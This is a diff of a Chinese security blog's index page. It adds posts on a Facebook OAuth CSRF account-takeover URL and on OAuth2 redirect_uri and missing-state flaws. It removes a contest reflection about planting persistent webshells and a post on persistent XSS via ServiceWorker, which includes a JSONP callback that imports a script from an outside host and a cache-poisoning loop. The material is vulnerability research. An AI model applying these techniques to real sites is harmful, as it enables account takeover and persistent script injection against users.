@@ -90,6 +90,105 @@
     
         <article class="post">
             <h1>
+                <a class="title" href="/2019/02/18/浅谈绕过Facebook Token进行CSRF账号接管/"> 
+                    对“绕过Facebook Token进行CSRF账号接管”的文章解读 
+                </a>
+            </h1>
+                        <div class="meta">
+                <a class="date"> 
+                    <i class="fa fa-calendar" aria-hidden="true"></i>                    
+                    2019-02-18   
+                </a>
+                
+                
+                
+                <a class="tag">
+                    <i class="fa fa-tags" aria-hidden="true"></i>  
+                </a>
+                
+                    <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/漏洞挖掘/">漏洞挖掘</a></li></ul>
+            </div>
+            <div class="content">
+                
+                <h1 id="浅谈绕过Facebook-Token进行CSRF账号接管"><a href="#浅谈绕过Facebook-Token进行CSRF账号接管" class="headerlink" title="浅谈绕过Facebook Token进行CSRF账号接管"></a>浅谈绕过Facebook Token进行CSRF账号接管</h1><p>今天早上看到Sam大佬推特发了这篇文章，下午就见到先知上有译文了。为什么有译文了还要写这篇文章呢？安全圈的译文你懂的，大部分右键一把梭。</p>
+<p>从文章本身来说，还是有比较值得学习的地方，所以摘出来流程分析一下。</p>
+<p>原文：<a href="https://ysamm.com/?p=185" target="_blank" rel="noopener">https://ysamm.com/?p=185</a></p>
+<p>先知译文: <a href="https://xz.aliyun.com/t/4089#toc-5" target="_blank" rel="noopener">https://xz.aliyun.com/t/4089#toc-5</a></p>
+<h1 id="漏洞关键条件"><a href="#漏洞关键条件" class="headerlink" title="漏洞关键条件"></a>漏洞关键条件</h1><p>攻击者有一个oauth认证接口，即漏洞网站可以授权自己的网站</p>
+<h1 id="漏洞流程"><a href="#漏洞流程" class="headerlink" title="漏洞流程"></a>漏洞流程</h1><p><img src="https://i.loli.net/2019/02/19/5c6c1ace4e4e3.jpg" alt></p>
+<p>第二步，即location的Url如下</p>
+<pre><code>https://www.facebook.com/comet/dialog_DONOTUSE/?
+url=/add_contactpoint/dialog/submit/%3fcontactpoint={EMAIL_CHOSEN}%26next=
+/v3.2/dialog/oauth%253fresponse_type%253dtoken%2526client_id%253d{ATTACKER_APP}%2526redirect_uri%253d{DOUBLE_URL_ENCODED_LINK]</code></pre><p>next参数为<strong>下一步跳转参数</strong>，即邮箱绑定后跳转到<code>/v3.2/dialog/oauth%253fresponse_type%253dtoken%2526client_id%253d{ATTACKER_APP}%2526redirect_uri%253d{DOUBLE_URL_ENCODED_LINK]</code>获取token再redirect到attacker web</p>
+<h1 id="总结-修复思考"><a href="#总结-修复思考" class="headerlink" title="总结/修复思考"></a>总结/修复思考</h1><p>漏洞新颖的点就在授权后的跳转，这也算是一种突破oauth的新思路。利用信任站点的重定向进行其它oauth的绑定，再携带token二次重定向到attacker web。</p>
+<p>如果能再二次重定向的地方加一个权限验证，即attacker app与oauth匹配，会不会避免这样的越权呢？</p>
+<p>其次就是，如果我们省略三方授权，直接诱导用户点击第二步的location，不就更省事了么？这点我邮寄了sam师傅，希望日后有其它研究的师傅可以指点一下~</p>
+
+                
+            </div>
+            <div class="continue">
+            <a href="/2019/02/18/浅谈绕过Facebook Token进行CSRF账号接管/">
+            Continue            <i class="fa fa-angle-right" aria-hidden="true"></i>
+            </a>
+            </div>
+        </article>
+        
+        <article class="post">
+            <h1>
+                <a class="title" href="/2019/02/14/Oauth2的两类漏洞挖掘/"> 
+                    Oauth2的两类漏洞挖掘 
+                </a>
+            </h1>
+                        <div class="meta">
+                <a class="date"> 
+                    <i class="fa fa-calendar" aria-hidden="true"></i>                    
+                    2019-02-14   
+                </a>
+                
+                
+                
+                <a class="tag">
+                    <i class="fa fa-tags" aria-hidden="true"></i>  
+                </a>
+                
+                    <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/漏洞挖掘/">漏洞挖掘</a></li></ul>
+            </div>
+            <div class="content">
+                
+                <h1 id="Oauth2的两类漏洞挖掘"><a href="#Oauth2的两类漏洞挖掘" class="headerlink" title="Oauth2的两类漏洞挖掘"></a>Oauth2的两类漏洞挖掘</h1><p>一直忘了总结这个，结合OPPX的网站(无漏洞站点)说明一下</p>
+<h2 id="redict-uri限制不严格-Oauth配置错误"><a href="#redict-uri限制不严格-Oauth配置错误" class="headerlink" title="redict_uri限制不严格(Oauth配置错误)"></a>redict_uri限制不严格(Oauth配置错误)</h2><h3 id="逻辑"><a href="#逻辑" class="headerlink" title="逻辑"></a>逻辑</h3><p>一般登陆选项是这样，常见的是QQ/微信/微博/…授权登陆<br><img src="https://i.loli.net/2019/02/14/5c64d712383f4.png" alt></p>
+<p>点击QQ授权的时候请求包和返回包如下<br><img src="https://i.loli.net/2019/02/14/5c64d71326e9b.png" alt></p>
+<p>request:</p>
+<pre><code>POST /oauth2.0/authorize HTTP/1.1
+Host: graph.qq.com
+response_type=code&amp;client_id=100498628&amp;redirect_uri=https%3A%2F%2Fmy.oppo.com%2Fauth%2Fqqcallback&amp;scope=get_user_info%2Cadd_share%2Clist_album%2Cadd_album%2Cupload_pic%2Cadd_topic%2Cadd_one_blog%2Cadd_weibo%2Ccheck_page_fans%2Cadd_t%2Cadd_pic_t%2Cdel_t%2Cget_repost_list%2Cget_info%2Cget_other_info%2Cget_fanslist%2Cget_idolist%2Cadd_idol%2Cdel_idol%2Cget_tenpay_addr&amp;state=49085978f5e969063165246c6d07e062&amp;switch=&amp;from_ptlogin=1&amp;src=1&amp;update_auth=1&amp;openapi=80901010&amp;g_tk=1156350624&amp;auth_time=1550070856795&amp;ui=97557FF6-0331-4598-BC09-6CD21B7106E0</code></pre><p>response:</p>
+<pre><code>HTTP/1.1 302 Moved Temporarily
+Server: nginx
+Date: Wed, 13 Feb 2019 15:17:13 GMT
+Content-Type: text/html
+Content-Length: 0
+Connection: close
+Location: https://my.oppo.com/auth/qqcallback?code=5E0AA09C0CA8179C186688ABAF4BE043&amp;state=49085978f5e969063165246c6d07e062</code></pre><p>流程：请求graph.qq.com获得授权，拿到auth code后拼接到redirect_uri再请求，这点可以在返回包中的Location看到。</p>
+<p>漏洞思路就是redict_uri限制不到位，严重的情况是没有限制域，一般情况是redict_uri可以到子域。QQ做了限制，拿cline_id和redirec_uri比对，不相符就返回False，如下<br><img src="https://i.loli.net/2019/02/14/5c64d712c68d7.png" alt></p>
+<h3 id="案例-第三方帐号快捷登录授权劫持漏洞"><a href="#案例-第三方帐号快捷登录授权劫持漏洞" class="headerlink" title="案例-第三方帐号快捷登录授权劫持漏洞"></a>案例-第三方帐号快捷登录授权劫持漏洞</h3><p>修改redirect_uri到子域(一般是论坛站点，可以加载外域图片的地方，或者是可以XSS的地方)。location跳转到子域后访问我们外域地址，referer就携带了code。</p>
+<h3 id="相关链接"><a href="#相关链接" class="headerlink" title="相关链接"></a>相关链接</h3><p>KEY：<a href="https://gh0st.cn/archives/2018-02-12/1" target="_blank" rel="noopener">https://gh0st.cn/archives/2018-02-12/1</a></p>
+<h2 id="无state导致CSRF产生的账户接管"><a href="#无state导致CSRF产生的账户接管" class="headerlink" title="无state导致CSRF产生的账户接管"></a>无state导致CSRF产生的账户接管</h2><p>用户在第三方网站A上登录后，通过Authorization code方式的绑定流程。</p>
+<h3 id="案例"><a href="#案例" class="headerlink" title="案例"></a>案例</h3><p>拿绑定QQ为例子。</p>
+<p>一般在登陆后的个人中心页面有绑定社交用户的功能，依然是请求greph.qq.com获取code，拼接到redirect_uri访问后完成绑定。如果没有state参数，用户在A登陆后进行，点击攻击者的redict_uri+code链接，就把用户A绑定在了攻击者的QQ上。可以看作是CSRF<br><img src="https://i.loli.net/2019/02/14/5c64d712f1b50.png" alt></p>
+<h3 id="相关链接-1"><a href="#相关链接-1" class="headerlink" title="相关链接"></a>相关链接</h3><p>OAuth2.0忽略state参数引发的CSRF漏洞：<a href="https://blog.csdn.net/gjb724332682/article/details/54428808" target="_blank" rel="noopener">https://blog.csdn.net/gjb724332682/article/details/54428808</a></p>
+<p>Oauth配置错误导致的账户接管：<a href="https://mp.weixin.qq.com/s/6lc6CHVjdXU1Zy4wWRIHzg" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/6lc6CHVjdXU1Zy4wWRIHzg</a></p>
+
+                
+            </div>
+            <div class="continue">
+            <a href="/2019/02/14/Oauth2的两类漏洞挖掘/">
+            Continue            <i class="fa fa-angle-right" aria-hidden="true"></i>
+            </a>
+            </div>
+        </article>
+        
+        <article class="post">
+            <h1>
                 <a class="title" href="/2019/02/02/Echsop2.7.x几处漏洞分析/"> 
                     Echsop2.7.x几处漏洞分析 
                 </a>
@@ -1658,206 +1757,6 @@ if(file_exists(&#39;z.tar.gz&#39;)){
             </div>
             <div class="continue">
             <a href="/2018/12/20/SWPUCTF2018 Write up/">
-            Continue            <i class="fa fa-angle-right" aria-hidden="true"></i>
-            </a>
-            </div>
-        </article>
-        
-        <article class="post">
-            <h1>
-                <a class="title" href="/2018/12/17/HCTF2018线下赛感想/"> 
-                    HCTF2018线下赛感想 
-                </a>
-            </h1>
-                        <div class="meta">
-                <a class="date"> 
-                    <i class="fa fa-calendar" aria-hidden="true"></i>                    
-                    2018-12-17   
-                </a>
-                
-                
-                
-                <a class="tag">
-                    <i class="fa fa-tags" aria-hidden="true"></i>  
-                </a>
-                
-                    <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/博客文章/">博客文章</a></li></ul>
-            </div>
-            <div class="content">
-                
-                <p>跑去丢了一趟人，实在是对不起各位师傅</p>
-<h1 id="反思"><a href="#反思" class="headerlink" title="反思"></a>反思</h1><p>比赛期恰逢考试期，几天一共就睡了几个小时，无论从体力或是经验都输的一塌糊涂。</p>
-<p>这次比赛也算是给自己个教训，<strong>准备不充分</strong>，就把之前备好的流量成功监控了，其余的东西几乎没用</p>
-<p>比赛开始配置网络用了挺长时间的，导致登上ssh以后就已经被别人上马了。</p>
-<p>其实这是很吃亏的事：第一，你无法及时备份原始的目录，这就有一个很严重的后果，如果后来一不小心恢复了留有马子的备份一切功亏一篑，更严重的是，如果你的一些服务被恶意删了，那开局就直接崩盘。</p>
-<p>第二，在你杀别人后门的时候，别人可能就已经打了你一轮，甚至可能会种新的马。而且杀后门的时间又占用了补洞的时间..新一轮的马子又会上来…</p>
-<p>所以上线一定要快，备份打的一定要快！</p>
-<p>教训就是，一定要在本地补好洞了，再传到机器上，宁可被打，也要修好自己的服务，被打总比down掉了好。这次吃了很大的亏，全场被check。</p>
-<p>所以，不要随便就删漏洞点，有时候漏洞点也是功能点。补洞不代表无脑卡权限，这次include的文件包含洞就可以换成file_get_contents来补。<strong>最重要的事，不要随便就把目录555了</strong>，如果Check点是上传和下载功能就凉了</p>
-<p>关于防御，<strong>一定要给自己留一个可用的后门</strong>,www-data权限一定得有一个，否则php进程可能都杀不掉</p>
-<h1 id="这次比赛后要准备的东西"><a href="#这次比赛后要准备的东西" class="headerlink" title="这次比赛后要准备的东西"></a>这次比赛后要准备的东西</h1><p>吃足了教训：<strong>手动上马是非常愚蠢的行为</strong></p>
-<h2 id="内置后门批量上马"><a href="#内置后门批量上马" class="headerlink" title="内置后门批量上马"></a>内置后门批量上马</h2><p>蓝莲花的moxiaoxi师傅的脚本思路大致是这样的：</p>
-<p>内置后门(能执行system函数)，通过散列生成随机名字的隐藏不死马+守护进程维护不死马+软连接来隐藏真实的请求</p>
-<p>最近要完成这个脚本</p>
-<h2 id="心态"><a href="#心态" class="headerlink" title="心态"></a>心态</h2><p>心态真的是很重要，不要因为被打就慌张，找到洞点，补好了再上服务，切忌慌里慌张。</p>
-<p>这次就算是交学费了，自闭</p>
-
-                
-            </div>
-            <div class="continue">
-            <a href="/2018/12/17/HCTF2018线下赛感想/">
-            Continue            <i class="fa fa-angle-right" aria-hidden="true"></i>
-            </a>
-            </div>
-        </article>
-        
-        <article class="post">
-            <h1>
-                <a class="title" href="/2018/11/14/RootkitXSS֮ServiceWorker/"> 
-                    RootkitXSS之ServiceWorker 
-                </a>
-            </h1>
-                        <div class="meta">
-                <a class="date"> 
-                    <i class="fa fa-calendar" aria-hidden="true"></i>                    
-                    2018-11-14   
-                </a>
-                
-                
-                
-                <a class="tag">
-                    <i class="fa fa-tags" aria-hidden="true"></i>  
-                </a>
-                
-                    <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/XSS测试/">XSS测试</a></li></ul>
-            </div>
-            <div class="content">
-                
-                <h1 id="RootkitXSS之ServiceWorker"><a href="#RootkitXSS之ServiceWorker" class="headerlink" title="RootkitXSS之ServiceWorker"></a>RootkitXSS之ServiceWorker</h1><p>文章首发于先知：<a href="https://xz.aliyun.com/t/3228#toc-10" target="_blank" rel="noopener">https://xz.aliyun.com/t/3228#toc-10</a></p>
-<p>在拿到一个可以XSS点的时候后，持久化成为一种问题。这几天跟师傅们接触到RootkiXss的一些姿势，受益匪浅</p>
-<h2 id="Serviceworker定义"><a href="#Serviceworker定义" class="headerlink" title="Serviceworker定义"></a>Serviceworker定义</h2><p>Service workers(后文称SW) 本质上充当Web应用程序与浏览器之间的代理服务器，也可以在网络可用时作为浏览器和网络间的代理。它们旨在（除其他之外）使得能够创建有效的离线体验，拦截网络请求并基于网络是否可用以及更新的资源是否驻留在服务器上来采取适当的动作。他们还允许访问推送通知和后台同步API。</p>
-<p>也就是说SW 提供了一组API，能够拦截当前站点产生HTTP请求，还能控制返回结果。因此，SW 拦住请求后，使用 Cache Storage 里的内容进行返回，就可以实现离线缓存的功能。当Cache Storage不存在请求的资源时再向服务器请求,cache.put可以选择性地将请求资源加载到cache storage中。如果不手动取消已经注册过的sw服务,刷新/重新打开页面都会启动站点的sw服务，这为我们持久化XSS提供了一定的条件。</p>
-<h3 id="查看SW服务"><a href="#查看SW服务" class="headerlink" title="查看SW服务"></a>查看SW服务</h3><p>Chrome地址栏访问 chrome://serviceworker-internals/，就可以看见已有的后台服务。</p>
-<h2 id="注册serviceworker"><a href="#注册serviceworker" class="headerlink" title="注册serviceworker"></a>注册serviceworker</h2><p>注册点js代码</p>
-<pre><code>&lt;script type=&quot;text/javascript&quot;&gt;
-    var url=&quot;//localhost/serviceworker.js&quot;;
-    if (&#39;serviceWorker&#39; in navigator) {
- navigator.serviceWorker.register(url)
- .then(function(registration) {
- console.log(&#39;ServiceWorker registration successful with scope: &#39;, registration.scope);
- })
-};
-&lt;/script&gt;
-normal visit</code></pre><p>script标签下的type必须指明为<code>text/javascript</code></p>
-<h3 id="event-request-clone"><a href="#event-request-clone" class="headerlink" title="event.request.clone()"></a>event.request.clone()</h3><p>对象的内容如图<br><img src="https://i.loli.net/2018/11/03/5bdd0e7b665f4.png" alt></p>
-<h2 id="攻击条件"><a href="#攻击条件" class="headerlink" title="攻击条件"></a>攻击条件</h2><h3 id="一个可以XSS的点"><a href="#一个可以XSS的点" class="headerlink" title="一个可以XSS的点"></a>一个可以XSS的点</h3><h3 id="sw文件可控"><a href="#sw文件可控" class="headerlink" title="sw文件可控"></a>sw文件可控</h3><p>如果说sw可以放在同源下,也就是js文件可控的话。直接注册Sw，代码如下：</p>
-<pre><code>// 拦截特定的Url，如果请求是对应的Url，则返回攻击的response
-self.addEventListener(&#39;fetch&#39;, function (event) {  
-    var url = event.request.clone(); 
-    body = &#39;&lt;script&gt;alert(&quot;test&quot;)&lt;/script&gt;&#39;;
-    init = {headers: { &#39;Content-Type&#39;: &#39;text/html&#39; }};
-    if(url.url==&#39;http://localhost/reurl.html&#39;){
-        res  = new Response(body,init);
-        event.respondWith(res.clone());
-    }
-});</code></pre><h3 id="jsonp回调接口"><a href="#jsonp回调接口" class="headerlink" title="jsonp回调接口"></a>jsonp回调接口</h3><p>利用储值型X点写入下面的代码</p>
-<p>当JSONP接口存在缺陷时，比如没有校验回调名。导致返回内容可控<br>比如：url?callback=importScript(…)<br>返回<code>importScript(...)</code><br>代码实现如下：</p>
-<pre><code>&lt;?php
-// JSONP 回调名缺少校验
-$cb_name = $_GET[&#39;callback&#39;];
-$cb_data = time();
-
-header(&#39;Content-Type: application/javascript&#39;);
-echo(&quot;$cb_name($cb_data)&quot;);</code></pre><p>attack_js</p>
-<pre><code>&lt;script type=&quot;text/javascript&quot;&gt;
-    var url=&quot;//localhost/getdata?callback=importScripts(&#39;//third.com/sw.js?g&#39;)&quot;;
-    if (&#39;serviceWorker&#39; in navigator) {
- navigator.serviceWorker.register(url)
- .then(function(registration) {
- console.log(&#39;ServiceWorker registration successful with scope: &#39;, registration.scope);
- })
-};
-&lt;/script&gt;</code></pre><p>这里面callback回调的事件就相当于sw脚本。当js被执行之后会注册一个sw脚本,内容是回调的事件<br><img src="https://i.loli.net/2018/11/05/5be04f7b70f25.png" alt><br><img src="https://i.loli.net/2018/11/05/5be04f9d988ca.png" alt></p>
-<p>或者鸡肋上传一个html到网站下</p>
-<pre><code>&lt;html&gt;
-&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html;charset=utf-8&quot; /&gt; 
-&lt;body&gt;
-&lt;script type=&quot;text/javascript&quot;&gt;
-    var url=&quot;//localhost/getdata?callback=importScripts(&#39;//third.com/sw.js?g&#39;)&quot;;
-    if (&#39;serviceWorker&#39; in navigator) {
- navigator.serviceWorker.register(url)
- .then(function(registration) {
- console.log(&#39;ServiceWorker registration successful with scope: &#39;, registration.scope);
- })
-};
-&lt;/script&gt;
-it&#39;s nothing
-&lt;/body&gt;
-&lt;/html&gt;</code></pre><h2 id="局限"><a href="#局限" class="headerlink" title="局限"></a>局限</h2><ul>
-<li>存在有缺陷的 JSONP 接口</li>
-<li>JSONP 的目录尽可能浅（最好在根目录下），如果放在域的根目录下，将会收到这个域下的所有fetch事件</li>
-<li>JSONP 返回的 Content-Type 必须是 JS 类型</li>
-<li>存在 XSS 的页面</li>
-</ul>
-<p>在网上看到一个师傅这样作例,引用一下：<br>service worker文件被放在这个域的根目录下，这意味着service worker和网站同源。换句话说，这个service work将会收到这个域下的所有fetch事件。如果我将service worker文件注册为/example/sw.js，那么，service worker只能收到/example/路径下的fetch事件（例如： /example/page1/, /example/page2/）</p>
-<h2 id="Cache缓存污染"><a href="#Cache缓存污染" class="headerlink" title="Cache缓存污染"></a>Cache缓存污染</h2><p>前文的攻击不涉及cache里的资源,进行的是协商缓存，下面说一下强缓存的利用。</p>
-<h2 id="请求资源"><a href="#请求资源" class="headerlink" title="请求资源"></a>请求资源</h2><p>如果使用cache.put方法，则请求的资源成功后会存在Cache Storage里。如果fetch里写了caches.match(event.request)方法，则每次请求时会先从caches找缓存来优先返回给请求页面。若没有缓存，再进行新的缓存操作。</p>
-<p>下面是一个缓存读取/判断的demo</p>
-<pre><code>// 拦截特定的Url，如果请求是对应的Url，则返回攻击的response。否则用Fetch请求网络上原本的url，进行本地缓存(为了不影响正常功能))
-self.addEventListener(&#39;fetch&#39;, function (event) {  
-        event.respondWith(
-            //console.log(event.request)
-        caches.match(event.request).then(function(res){
-        if(res){//如果有缓存则使用缓存
-        return res;
-        }
-        return requestBackend(event);//没缓存就进行缓存
-        })
-        )
-   });
-
-function requestBackend(event){  
-        var url = event.request.clone();  
-        console.log(url)  //打印内容是打印到请求页面
-        if(url.url==&#39;http://localhost/reurl.html&#39;){//判断是否为需要劫持的资源
-
-        return new Response(&quot;&lt;script&gt;alert(1)&lt;/script&gt;&quot;, {headers: { &#39;Content-Type&#39;: &#39;text/html&#39; }})
-        }
-        return fetch(url).then(function(res){
-        //检测是否为有效响应
-        if(!res || res.status !== 200 || res.type !== &#39;basic&#39;){
-        return res;
-        }
-        var response = res.clone();
-        caches.open(&#39;v1&#39;).then(function(cache){  //打开v1缓存进行存储
-        cache.put(event.request, response);
-        });
-
-        return res;
-        })
-}</code></pre><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>前几天看ED师傅的研究,发现这种好玩但是鸡肋的方法。上面提到cache.put的方法把js资源添加到Cache Storage，其实如果我们用cache.put把恶意代码插入,覆盖原始的js数据。后果就是当sw请求cahce里的资源时会执行恶意代码。比如workbox会先从缓存读取静态资源,我们用异步请求将恶意代码无限覆盖这个缓存时：</p>
-<p>控制台输入下面的恶意代码</p>
-<pre><code>async function replay() {
-    const name = &#39;xx&#39;
-    const url = &#39;xx&#39;
-    const payload = `
-alert(1);
-`
-    let cache = await caches.open(name);
-    let req = new Request(url);
-    let res = new Response(payload + replay + &#39;;replay()&#39;);   //执行alert+写入cache内容+执行fn
-    setInterval(_ =&gt; {
-      cache.put(req, res.clone());
-    }, 500);
-}
-replay();</code></pre><p>就可以在cache Storage里看到500ms刷新并覆盖一次的js资源。<br><img src="https://i.loli.net/2018/11/05/5be0502e0dd09.png" alt></p>
-<h2 id="相关链接"><a href="#相关链接" class="headerlink" title="相关链接"></a>相关链接</h2><p>Service Worker API(<a href="https://developer.mozilla.org/zh-CN/docs/Web/API/Service_Worker_API" target="_blank" rel="noopener">https://developer.mozilla.org/zh-CN/docs/Web/API/Service_Worker_API</a>)</p>
-<p>浏览器缓存知识(<a href="https://www.cnblogs.com/lyzg/p/5125934.html" target="_blank" rel="noopener">https://www.cnblogs.com/lyzg/p/5125934.html</a>)</p>
-
-                
-            </div>
-            <div class="continue">
-            <a href="/2018/11/14/RootkitXSS֮ServiceWorker/">
             Continue            <i class="fa fa-angle-right" aria-hidden="true"></i>
             </a>
             </div>
